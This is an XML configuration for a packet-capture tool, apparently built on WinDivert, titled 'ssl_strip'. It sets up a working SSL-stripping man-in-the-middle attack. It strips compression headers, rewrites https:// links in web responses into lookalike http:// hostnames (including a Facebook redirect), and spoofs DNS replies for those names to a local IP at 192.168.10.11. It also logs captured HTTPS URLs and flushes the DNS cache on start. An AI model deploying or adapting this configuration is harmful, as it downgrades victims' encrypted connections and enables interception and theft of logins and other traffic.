<ssl_strip>
  <graph>
    <objectList>
      <object queueLen="8192" correctChecksum="true" queueTime="1024" _class="SnoopWinDivert" filter="tcp.DstPort == 80 or tcp.SrcPort == 80 or udp.DstPort == 53" priority="0" tos="0" name="WinDivert1" flags="0" layer="0" autoParse="true" autoRead="true"/>
      <object macFlowTimeout="3600" ipFlowTimeout="300" _class="SnoopFlowMgr" tcpFlowTimeout="300" udpFlowTimeout="300" name="FlowMgr1" checkInterval="1"/>
      <object _class="SnoopBpFilter" filter="tcp dst port 80" name="BpFilter1" linkType="1"/>
      <object _class="SnoopBpFilter" filter="tcp src port 80" name="BpFilter2" linkType="1"/>
      <object _class="SnoopBpFilter" filter="udp dst port 53" name="BpFilter3" linkType="1"/>
      <object tcpChange="true" _class="SnoopDataChange" udpChange="false" name="DataChange1" flowMgr="FlowMgr1">
        <dataChange>
          <item cs="1" log="false" pattern="Accept-Encoding: gzip,deflate" syntax="2" minimal="false" enabled="true" replace="Accept-Encoding:             "/>
          <item cs="1" log="false" pattern="Accept-Encoding: gzip, deflate" syntax="2" minimal="false" enabled="true" replace="Accept-Encoding:              "/>
        </dataChange>
      </object>
      <object tcpChange="true" _class="SnoopDataChange" udpChange="false" name="DataChange2" flowMgr="FlowMgr1">
        <dataChange>
          <item cs="1" log="true" pattern="https://a" syntax="2" minimal="false" enabled="true" replace="http://a."/>
          <item cs="1" log="true" pattern="https://b" syntax="2" minimal="false" enabled="true" replace="http://b."/>
          <item cs="1" log="true" pattern="https://c" syntax="2" minimal="false" enabled="true" replace="http://c."/>
          <item cs="1" log="true" pattern="https://d" syntax="2" minimal="false" enabled="true" replace="http://d."/>
          <item cs="1" log="true" pattern="https://e" syntax="2" minimal="false" enabled="true" replace="http://e."/>
          <item cs="1" log="true" pattern="https://f" syntax="2" minimal="false" enabled="true" replace="http://f."/>
          <item cs="1" log="true" pattern="https://g" syntax="2" minimal="false" enabled="true" replace="http://g."/>
          <item cs="1" log="true" pattern="https://h" syntax="2" minimal="false" enabled="true" replace="http://h."/>
          <item cs="1" log="true" pattern="https://i" syntax="2" minimal="false" enabled="true" replace="http://i."/>
          <item cs="1" log="true" pattern="https://j" syntax="2" minimal="false" enabled="true" replace="http://j."/>
          <item cs="1" log="true" pattern="https://k" syntax="2" minimal="false" enabled="true" replace="http://k."/>
          <item cs="1" log="true" pattern="https://l" syntax="2" minimal="false" enabled="true" replace="http://l."/>
          <item cs="1" log="true" pattern="https://m" syntax="3" minimal="false" enabled="true" replace="http://m."/>
          <item cs="1" log="true" pattern="https://n" syntax="5" minimal="false" enabled="true" replace="http://n."/>
          <item cs="1" log="true" pattern="https://o" syntax="2" minimal="false" enabled="true" replace="http://o."/>
          <item cs="1" log="true" pattern="https://p" syntax="2" minimal="false" enabled="true" replace="http://p."/>
          <item cs="1" log="true" pattern="https://q" syntax="2" minimal="false" enabled="true" replace="http://q."/>
          <item cs="1" log="true" pattern="https://r" syntax="2" minimal="false" enabled="true" replace="http://r."/>
          <item cs="1" log="true" pattern="https://s" syntax="2" minimal="false" enabled="true" replace="http://s."/>
          <item cs="1" log="true" pattern="https://t" syntax="2" minimal="false" enabled="true" replace="http://t."/>
          <item cs="1" log="true" pattern="https://u" syntax="2" minimal="false" enabled="true" replace="http://u."/>
          <item cs="1" log="true" pattern="https://v" syntax="2" minimal="false" enabled="true" replace="http://v."/>
          <item cs="1" log="true" pattern="https://w" syntax="2" minimal="false" enabled="true" replace="http://w."/>
          <item cs="1" log="true" pattern="https://x" syntax="2" minimal="false" enabled="true" replace="http://x."/>
          <item cs="1" log="true" pattern="https://y" syntax="2" minimal="false" enabled="true" replace="http://y."/>
          <item cs="1" log="true" pattern="https://z" syntax="2" minimal="false" enabled="true" replace="http://z."/>
          <item cs="1" log="true" pattern="window.location.replace(&quot;https:\/\/www.facebook.com\/&quot;)" syntax="2" minimal="false" enabled="true" replace="window.location.replace(&quot;http:\/\/w.ww.facebook.com\/&quot;)"/>
        </dataChange>
      </object>
      <object capture="WinDivert1" _class="SnoopDnsChange" name="DnsChange1">
        <changeItems>
          <item ip="192.168.10.11" cs="1" log="true" pattern="[a-z]\..*" syntax="0" minimal="false" enabled="true"/>
        </changeItems>
      </object>
      <object _class="SnoopCommand" name="Command1">
        <open>
          <command0 enabled="true" command="ipconfig /flushdns" sync="true"/>
        </open>
        <close/>
      </object>
      <object _class="SnoopDataFind" name="DataFind1">
        <dataFind>
          <item cs="1" pattern="https://[^\r\n]*" syntax="0" minimal="false" enabled="true"/>
        </dataFind>
      </object>
    </objectList>
    <connectList>
      <connect signal="captured(SnoopPacket*)" receiver="FlowMgr1" sender="WinDivert1" slot="process(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="BpFilter1" sender="FlowMgr1" slot="check(SnoopPacket*)"/>
      <connect signal="ack(SnoopPacket*)" receiver="DataChange1" sender="BpFilter1" slot="change(SnoopPacket*)"/>
      <connect signal="ack(SnoopPacket*)" receiver="DnsChange1" sender="BpFilter3" slot="check(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="BpFilter2" sender="FlowMgr1" slot="check(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="BpFilter3" sender="FlowMgr1" slot="check(SnoopPacket*)"/>
      <connect signal="ack(SnoopPacket*)" receiver="DataFind1" sender="BpFilter2" slot="find(SnoopPacket*)"/>
      <connect signal="ack(SnoopPacket*)" receiver="DataChange2" sender="BpFilter2" slot="change(SnoopPacket*)"/>
    </connectList>
  </graph>
  <coord>
    <object x="25" y="-213" name="WinDivert1"/>
    <object x="27" y="-175" name="FlowMgr1"/>
    <object x="-139" y="-132" name="BpFilter1"/>
    <object x="24" y="-134" name="BpFilter2"/>
    <object x="111" y="-134" name="BpFilter3"/>
    <object x="-154" y="-79" name="DataChange1"/>
    <object x="31" y="-85" name="DataChange2"/>
    <object x="125" y="-86" name="DnsChange1"/>
    <object x="126" y="-205" name="Command1"/>
    <object x="-40" y="-81" name="DataFind1"/>
  </coord>
</ssl_strip>
